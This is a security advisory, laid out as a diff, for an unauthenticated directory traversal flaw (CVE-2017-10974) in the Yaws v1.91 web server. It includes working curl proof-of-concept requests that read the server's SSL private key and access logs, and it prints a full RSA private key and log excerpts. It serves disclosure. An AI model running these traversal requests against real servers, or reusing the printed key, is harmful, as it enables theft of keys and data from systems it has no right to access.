@@ -1,0 +1,126 @@
+[+] Credits: John Page aka hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/YAWS-WEB-SERVER-v1.91-UNAUTHENTICATED-REMOTE-FILE-DISCLOSURE.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==========
+yaws.hyber.org
+
+
+
+Product:
+===========
+Yaws v1.91 (Yet Another Web Server)
+
+Yaws is a HTTP high perfomance 1.1 webserver particularly well suited for dynamic-content web applications.
+Two separate modes of operations are supported:
+
+Standalone mode where Yaws runs as a regular webserver daemon. This is the default mode.
+Embedded mode where Yaws runs as an embedded webserver in another Erlang application.
+
+
+
+Vulnerability Type:
+===================
+Unauthenticated Remote File Disclosure
+
+
+
+CVE Reference:
+==============
+CVE-2017-10974
+
+
+
+Security Issue:
+================
+Remote attackers who can reach Yaws web server can read the server SSL private key file using directory
+traversal attacks, access logs are also disclosed etc... this version is somewhat old, however, still avail for download
+as of the time of this writing. http://yaws.hyber.org/download/
+
+
+
+Exploit/POC:
+=============
+Steal Yaws Server SSL private key ".pem" file.
+
+curl http://REMOTE-VICTIM-IP:8080/%5C../ssl/yaws-key.pem
+
+
+-----BEGIN RSA PRIVATE KEY-----
+MIICWwIAAAKBgQDMJHAcJXB9TzkYg/ghXNjOAp3zcgKC4XZo4991SPGYukKVU1Fv
+RX0YgPx3wz8Ae7ykPg0KW7O3D9Pn8liazTYEaXskNKAzOFr1gtBd7p937PKNQk++
+3/As5EfJjz+lBrwUGbSicJgldJk3Cj89htMUqGwL2Bl/yOQIsZtyLlrP1wIDAQAB
+AoGAYgEwTWLwAUjSaWGs8zJm52g8Ok7Gw+CfNzYG5oCxdBgftR693sSmjOgHzNtQ
+WMQOyW7eDBYATmdr3VPsk8znHBSfQ19gAJjR89lJ6lt5qDMNtXMUWILn91g+RbkO
+gmTkhD8uc0e/3FJBwPxFJWQzFEcAR4jNFJwhNzg6CO8CK/ECQQD7sNzvMRnUi1RQ
+tiKgRxdjdEwNh52OUPwuJWhKdBLIpHBAJxCBHJB+1N0ufpqaEgUfJ5+gEYrBRMJh
+aTCIJul5AkEAz6MsmkMz6Iej5zlKrlDL5q6GU+wElXK/F1H8tN/JchoSXN8BRCJZ
+DLpK0mcMN4yukHKDCo0LD9NBlRQFDll/zwJASb2CrW2kVLpRhKgoMu9BMflDwv8G
+IcqmZ9q72HxzeGd9H76SPlGhIBe7icC8CQHYkE0qnlolXgSIMsP/3RQReQJAYHnt
++INvNAUKSB6br6EFDNtcuNO6UYJufbRvmc89d5HbpGFN4k2fWMWajGarC4iHd8Bt
+WNKuKB09pLoXm1JEiwJAfRtIXE6sr4MQOL6aWwGElw+Yb4B1WBhBiPRRwGTX0nzN
+HXF3851+kgZBZjjzA3Ib2nr5PeXkZBBLE/4jJvRPRA==
+-----END RSA PRIVATE KEY-----
+
+
+
+--- OR Read the access logs. ---
+
+
+curl http://REMOTE-VICTIM-IP:8080/%5C../logs/localhost.8080.access  
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY>
+<H1>Not Found</H1>The requested URL /../logs/localhost.8080.access was not found on this server.<P><HR>
+<address> Yaws 1.91 Server at localhost:8080 </address>  </BODY></HTML>[root@localhost ~]# 
+
+Then,
+
+
+curl http://REMOTE-VICTIM-IP:8080/%5C../logs/localhost.8080.access
+
+127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] "GET / HTTP/1.1" 200 74419 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] "GET /stil.css HTTP/1.1" 200 1677 "http://127.0.0.1:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] "GET /icons/yaws_head.gif HTTP/1.1" 200 2308 "http://127.0.0.1:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] "GET /icons/yaws_pb.gif HTTP/1.1" 200 1444 "http://127.0.0.1:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] "GET /icons/yaws_y.gif HTTP/1.1" 200 4831 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+127.0.0.1 - - [26/Jun/2017:09:52:33 -0400] "GET /bindings.yaws HTTP/1.1" 200 5502 "http://127.0.0.1:8080/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+127.0.0.1 - - [26/Jun/2017:09:52:42 -0400] "GET /configuration.yaws HTTP/1.1" 200 8634 "http://127.0.0.1:8080/bindings.yaws" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+etc...
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=================================
+Vendor Notification: June 26, 2017
+No replies
+July 7, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
